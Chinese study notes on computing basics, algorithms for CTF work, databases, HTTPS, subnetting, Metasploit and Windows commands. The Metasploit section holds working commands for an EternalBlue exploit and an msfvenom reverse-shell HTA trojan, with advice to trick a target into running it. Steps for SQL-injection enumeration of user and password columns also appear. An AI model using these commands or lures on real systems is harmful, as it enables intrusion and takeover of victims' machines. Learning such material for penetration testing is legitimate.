虚拟机知识

kali linux虚拟机需要iso镜像文件，因为需要个性化配置，自动创建了一个vmdk空白磁盘文件，然后通过iso配置

但是靶机不需要可视化图像因此不需要iso镜像文件，只需要更换磁盘文件即可，直接把别人修改好的vmdk文件拿来用

镜像就相当于克隆出了一个系统

处理器CPU

处理器相当于公司大楼数量，内核相当于大楼里的员工，内核总数就是总员工数

内核是真正的干活计算单元，一个核心最多只能感一件事，多个核心就能干多件事，来提升效率

硬盘

硬盘装有系统，文件，软件(可以发挥功能的文件

整理文件碎片是把文件放连续便于读取

接口从慢到快有IDE,SATA,M.2，接口就是用来把磁盘上的文件呈现给人类，相当于连接口，翻译官

等同电源接口，USB接口(和端口意思很像)

  • 物理硬件 = 硬盘（负责永久存储）
  • 操作系统显示 = C盘/D盘（硬盘上的分区）
  • 数据中转站 = 内存（负责临时存放正在运行的数据）
  • 数据要拿到内存中去处理

算法

  • 正在贬值的部分（“术”）： 手写代码的能力、默写标准解法的熟练度、应对无AI竞赛的刷题技巧。这部分正在被AI快速替代。
  • 正在升值的部分（“道”）： 面对复杂问题时的拆解能力、对算法模型的场景匹配能力、对复杂度的权衡决策能力。这部分是AI难以替代的“人类壁垒”。

第一部分：基础数据结构——你的“工具箱”

在任何复杂的策略之前，首先要识别出数据长什么样。这就像你要修理东西，先得知道手里拿的是扳手还是螺丝刀。

数据结构 它长什么样？ 核心解决什么问题？ 看到什么场景用它？
数组 / 链表 一串排着队的元素。 存储和遍历一组数据。 几乎是一切程序的基础。需要快速访问用数组，需要频繁插入删除用链表。
栈 一个桶。后进先出。 处理具有“回溯”性质的问题。 CTF/安全场景：函数调用栈跟踪、括号匹配检测、表达式求值、浏览器的后退功能。
队列 一根管道。先进先出。 处理具有“排队”性质的问题。 CTF/安全场景：广度优先搜索（BFS）的基础、任务调度、处理并发请求的缓冲池。
哈希表 一个超级查找表。 在几乎不花时间的情况下，快速查找、删除、插入数据。 通用/安全：建索引、缓存数据、检查重复元素。在Web安全中，用来快速匹配恶意负载特征库。
树 一个分层的目录。有根有叶。 表示具有层级关系的数据。 通用：文件系统、域名解析（DNS）。算法核心：二叉搜索树（快速查找）、堆（找最大值/最小值）。
图 一张地图（网络）。节点和连线。 表示实体之间的复杂关系。 CTF/安全场景：社交网络分析（找攻击者关联）、网络拓扑分析（找关键节点）、推荐系统。

第二部分：核心算法策略——你的“兵法”

这是你作为“战略师”的核心。当你面对一个具体的、复杂的问题时，你需要调用这部分知识来制定作战计划。

1. 我需要在数据中查找什么？

  • 场景：给你一个有序的列表（比如排好序的IP黑名单），快速找到某个IP在不在里面。
  • 战略：查找策略。
  • 工具包：
    • 二分查找：数据是有序的，就用它。效率极高。（必知）
    • 深度优先搜索（DFS）：一条道走到黑。适合“是否存在一条路径”、“遍历所有可能性”（如走迷宫）。（必知）
    • 广度优先搜索（BFS）：层层递进。适合找“最短路径”、“最少步骤”。（必知）

2. 我需要把一堆东西安排得明明白白？

  • 场景：CPU处理任务、物流规划、比赛日程安排。
  • 战略：排序与调度策略。
  • 工具包：
    • 各种排序（快排、归并、堆排）：你不需要会手写，但必须知道：快排是通用的，归并排序适合处理超大数据（外部排序），堆排序适合在数据流中动态找最大/最小。在CTF逆向中，识别出用了什么排序算法能帮你理解程序逻辑。
    • 拓扑排序：当事情有依赖关系时（A必须先于B完成），用它排出执行顺序。比如编译依赖、课程安排。（推荐了解）

3. 在资源有限的情况下，如何达到最好（或最省）？

  • 场景：网络流量最小化、地图导航、布线成本最低。
  • 战略：图论与优化策略。这是算法中最有价值的部分之一。
  • 工具包：
    • 最短路径（Dijkstra、Floyd）：地图导航。Dijkstra是“从一个点到其他所有点的最短路径”（无负权）。（必知） 在网络攻防中，模拟攻击路径时这就是核心模型。
    • 最小生成树（Prim、Kruskal）：如何用最低成本（比如最少的电缆）把所有点连接起来。设计网络布线、管道铺设。（推荐了解）
    • 动态规划（DP）：这是最难也是最强大的。核心思想是**“大事化小，记住结果”。适合求“最值”问题（最多、最少、最长），且问题能拆分成重叠的子问题。比如：背包问题（资源有限下装价值最高的东西）、最长公共子序列（对比文件差异，就是diff工具的原理）。（理解其思想即可，不建议死磕难题）**

4. 数据挖掘与模式发现（AI/安全的交叉领域）

  • 场景：从海量日志中发现攻击模式、对用户进行分群、做推荐系统。
  • 战略：统计与机器学习策略。
  • 工具包：
    • 分类（KNN、决策树、SVM）：把新东西归类。比如，根据邮件特征判断它是垃圾邮件还是正常邮件。（了解应用场景）
    • 聚类（K-Means）：把一堆东西自动分成几堆。比如，在流量日志中，自动把相似的攻击行为聚成一类，发现未知攻击。（了解应用场景）
    • 关联规则（Apriori）：发现“买了A的人也常买B”这种规律。（了解应用场景）
    • PageRank：给网页排名。核心思想是被越多高质量页面引用，自己质量就越高。这是搜索引擎的基石，也适用于社交网络影响力分析。（了解思想）

第三部分：CTF/网络安全领域的“专项战略地图”

把上面的通用兵法，具体落到你的主战场上，你的“规划”会是这样的：

在CTF中遇到的情况 问题的本质（需要识别） 可以用的算法策略（规划） 执行（AI来写）
逆向工程：拿到一个程序，看到它用了某种排序或查找。 这是一个已知的算法模式。 “它这里用了快速排序，这里是二分查找。我可以让AI生成对应算法的特征代码，帮我在内存中快速定位关键数据。” AI生成快速排序/二分查找的示例代码。
Pwn / 二进制：需要泄露内存地址，绕过ASLR(地址空间布局随机化)。 需要暴力枚举或部分覆盖。 “需要用贪心策略，先泄露一个字节，根据反馈再泄露下一个。这本质上是一种按位的深度优先搜索。” AI写一个自动化的、按位爆破的脚本框架。
Web安全：发现一个接口有逻辑漏洞，可以无限次重放请求。 这是一个有限资源下的最优解问题。 “需要在被WAF封IP之前，用最快的速度遍历所有可能的ID。这是一个典型的广度优先搜索（BFS）任务，我需要把待测ID放进队列，开启多线程。” AI写一个支持多线程、队列管理的并发请求脚本。
密码学：遇到一个加密算法，需要逆向破解。 这是一个数学函数/映射问题。 “算法看起来用了模幂运算，核心是欧几里得算法求逆元。我让AI用数学库实现一下这个大数运算。” AI调用Python的gmpy2库，实现扩展欧几里得算法。
流量分析：拿到海量的PCAP包。 这是数据挖掘/模式识别问题。 “要用聚类算法把相似的流量会话分到一起，找出异常的、偏离正常簇的那一个。然后用关联规则分析它在和哪些异常IP通信。” AI调用Sklearn库，写一个K-Means聚类分析的脚本。

总结：

    • 数据结构：数组、链表、栈、队列、哈希表、树、图。
    • 算法思想：二分查找、DFS、BFS、Dijkstra（最短路径）、排序（快排、归并）、动态规划（基本思想）。
    • 其他图算法：最小生成树、拓扑排序、最大流。
    • 经典模型：生产者-消费者问题（队列）、背包问题（DP）。
    • 机器学习基础：分类、聚类、回归是干什么的。

数据库

表名 主要作用 在 SQL 注入中的核心用途
1. SCHEMATA 表 提供 MySQL 实例中所有数据库名的信息。 用于获取目标服务器上所有数据库的名称，相当于执行 show databases 命令。
2. TABLES 表 提供数据库中所有表名的信息。 在知道数据库名后，用于获取该数据库下所有数据表的名称。
3. COLUMNS 表 提供表中所有列名的详细信息。 在知道表名后，用于获取该表中所有字段（列）的名称，为后续提取数据做准备。

  1. 先查 SCHEMATA：获取所有数据库名，找到可能存放敏感信息的库（如 users、admin）。

  2. 再查 TABLES：根据库名，获取该库下所有的表名，找到关键表（如 user、admin）。

  3. 最后查 COLUMNS：根据库名和表名，获取该表中所有的列名，找到关键字段（如 username、password）。

    • 代表产品：Elasticsearch、Apache Solr。

    二、向量数据库

    • 核心功能：存储和索引多维向量，通过计算向量间的相似度来进行高效查询。
    • 主要应用：
      • 人工智能：人脸识别、语义搜索、AI知识库（如大模型的长期记忆）。
      • 推荐系统：寻找与用户兴趣最相似的物品。

    三、图数据库

    • 核心功能：以节点和边的形式存储数据，专门用于处理复杂的、深度的关系网络。
    • 主要应用：社交网络关系分析、 fraud detection（欺诈检测）、知识图谱。

    四、时序数据库

    • 核心功能：针对时间戳数据进行优化，擅长处理持续产生的高频写入和高压缩率数据。
    • 主要应用：监控系统（如服务器CPU、内存使用率）、物联网传感器数据分析。

    五、内存数据库

    • 核心功能：将数据主要存储在内存（RAM）中，以实现极低延迟的数据读写。
    • 主要应用：实时报表生成、数据仓库加速、商业智能（BI）分析、缓存系统。

    六、多模数据库

    • 核心功能：一个数据库引擎同时支持多种数据模型，无需部署多个数据库系统。
    • 支持类型：可以同时处理键值对、图形、文档、关系型等多种数据结构。

    七、总结：多边形的战士

    • 核心理念：没有一个单一的数据库能解决所有问题。一个成熟的、复杂的项目，往往是由上述多种不同类型的数据库结合而成的。它们各司其职，共同构建出功能完善、性能强大的应用系统，就像一个拥有多种能力的“多边形战士”。

https协议/http

实际就是一个公钥密码体制和私钥密码体制以及CA配合的过程，我们所有的社交软件聊天也是这样的

  1. CA验证：服务器发送数字证书，浏览器用内置CA公钥验证签名，确保证书里的公钥是真的、没被篡改。
  2. 非对称加密传密钥：浏览器生成对称密钥，用证书里的服务器公钥加密后传给服务器，服务器用私钥解密，安全协商出共同密钥。
  3. 对称加密传数据：之后所有网页数据都用这个对称密钥加密传输，保证效率的同时防止窃听和篡改。

分类别：

C类： 192.0.0.0 到 223.255.255.255。（这就是你提到的“192段到223段”）

掩码写成二进制，连续的1代表网络位，连续的0代表主机位。例如，一个255.255.255.0（/24）的掩码，前24位是1，意味着前3段（如192.168.1）是网段，最后一段（.x）是主机号。

可用的主机数 = 2^（主机位的位数） - 2

计算网络地址用逻辑与 异或是相同为0 不同为1

MSF：

msfconsole和msfvenom是Metasploit框架中的两个核心组件，一个用于交互式攻击指挥，另一个用于生成恶意载荷。

具体区别如下：

📡 msfconsole：主控台

msfconsole是Metasploit框架最主要的命令行接口。你可以把它理解为整个渗透测试操作的中心控制平台。

  • 核心功能：在这里输入各种命令来启动攻击模块（Exploit）、管理攻击载荷（Payload）、建立监听器、以及控制已经攻陷的目标主机（通过Meterpreter会话）。
  • 工作方式：提供一个交互式环境，让你能够搜索并使用Metasploit框架内数以千计的模块（如漏洞利用、扫描器等），并对这些模块进行详细的参数配置。

🧬 msfvenom：载荷生成器

msfvenom是一个独立的命令行工具，专门用于生成和编码攻击载荷。它由旧版工具msfpayload和msfencode合并而来。

  • 核心功能：根据你的要求，“定制”生成一个恶意程序或一段代码（即Payload）。
  • 工作方式：你通过参数指定Payload的类型（如windows/meterpreter/reverse_tcp）、你的IP地址（LHOST）、监听端口（LPORT）以及输出格式（如exe、elf、python等），它会生成对应的恶意文件。

一句话总结：msfvenom负责制造“炮弹”（生成木马），而msfconsole负责发射“炮弹”并接收“战果”（配置监听器并控制目标）。

⚔️ 主动攻击与被动攻击的一般流程

在MSF中，攻击模式主要分为**主动（Active）和被动（Passive）**两种。

1. 主动攻击流程

主动攻击是指攻击机主动向目标机的开放端口发送攻击数据。这类攻击通常利用目标系统上运行的网络服务漏洞（如SMB、RPC等）。

特点：直接、快速，但容易被防火墙拦截或触发入侵检测系统（IDS）警报。

一般流程：

  1. 信息收集：使用Nmap等工具扫描目标，发现其开放端口和操作系统版本。

  2. 启动控制台：在Kali Linux中输入msfconsole启动主控台。

  3. 搜索模块：根据漏洞信息搜索对应的攻击模块，例如著名的ms17_010_eternalblue（永恒之蓝）。

    bash

    search ms17-010

  4. 使用模块：选定要使用的攻击模块。

    bash

    use exploit/windows/smb/ms17_010_eternalblue

  5. 配置参数：使用show options查看必填项，通常需要设置目标IP（RHOSTS）和本机IP（LHOST，用于反向连接时）。

    bash

    set RHOSTS 192.168.1.100
set LHOST 192.168.1.5

  6. 选择载荷：设定攻击成功后回连的载荷（Payload），通常选用反向连接的Meterpreter。

    bash

    set PAYLOAD windows/x64/meterpreter/reverse_tcp

  7. 发动攻击：输入run或exploit执行攻击。

    bash

    exploit

  8. 后渗透：攻击如果成功，会建立一个Meterpreter会话，输入sessions -i 1进入会话进行后续操作。

2. 被动攻击流程

被动攻击是指攻击机在本地搭建一个恶意的服务器（如Web、FTP服务器），诱导目标客户端（如浏览器、Office软件）主动连接过来，从而触发漏洞。

特点：需要一定的社会工程学技巧来欺骗用户，但成功率更高，且能穿透大部分边界防火墙。

一般流程：

  1. 生成木马：使用msfvenom生成一个恶意文件，例如一个包含恶意宏的Word文档或一个伪装成PDF的恶意程序。

    bash

    # 示例：生成一个HTA文件
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f hta-psh -o evil.hta

  2. 启动控制台：启动msfconsole。

  3. 配置监听：使用exploit/multi/handler模块，设置一个与生成木马时完全相同的Payload和IP/端口参数。

    bash

    use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit

  4. 发起诱导：此时MSF会开始监听等待连接。你需要将生成的木马文件发送给目标，并想方设法诱骗他在他的电脑上运行。

  5. 获得会话：一旦目标运行了木马，MSF的监听器就会捕捉到连接，并自动建立Meterpreter会话。

windows指令

msinfo32 查看BIOS版本，主板型号，已安装驱动列表

dxdiag 运行 dxdiag → “显示”选项卡查看显存大小、驱动日期；运行 3D 加速测试

wmic wmic cpu get name → 显示 CPU 型号 wmic diskdrive get serialnumber → 获取硬盘序列号

systeminfo 显示 OS 版本、安装补丁、网卡配置等

示例：命令行输入 systeminfo | find “系统启动时间” → 查看本次开机时长

ipconfig ipconfig /all → 显示所有网卡的 MAC 地址、DHCP 状态

ipconfig /release + ipconfig /renew → 手动释放并重新获取 IP（适用于 DHCP 网络）

ipconfig /flushdns → 清空 DNS 缓存，解决网页解析错误

ping - 网络连通性与延迟测试

示例：ping -t baidu.com → 持续 ping 直到手动停止（Ctrl+C），用于观察丢包率 ping -n 20 -l 1400 192.168.1.1 → 发送 20 个 1400 字节包到网关，测试大包传输

tracert 用途：定位网络瓶颈或故障节点

示例：tracert -d github.com → 不解析域名（加快速度），显示从本机到服务器的每一跳延迟

netstat netstat -ano → 显示所有连接及对应 PID（可查异常外连进程）

netstat -an | find “ESTABLISHED” → 仅显示已建立的 TCP 连接

netstat -e → 统计网卡收发包数量

tasklist tasklist /fi “memusage gt 500000” → 显示内存占用超过 500MB 的进程 tasklist /svc → 查看每个进程对应的 Windows 服务

taskkill taskkill /pid 1234 /f → 强制结束 PID 1234 的进程 taskkill /im notepad.exe /f → 强制关闭所有记事本窗口

services.msc - 服务控制台（图形化） 用途：设置服务启动类型、手动启停

示例：运行 services.msc → 找到 Print Spooler → 右键重启以清空打印队列

diskpart 磁盘分区工具

list disk → 显示所有硬盘 select disk 0 → 选中磁盘0 list partition → 查看分区 clean → 擦除整个磁盘（慎用！）

chkdsk 示例：chkdsk C: /f /r → 检查 C 盘逻辑错误并尝试恢复坏扇区（需重启）
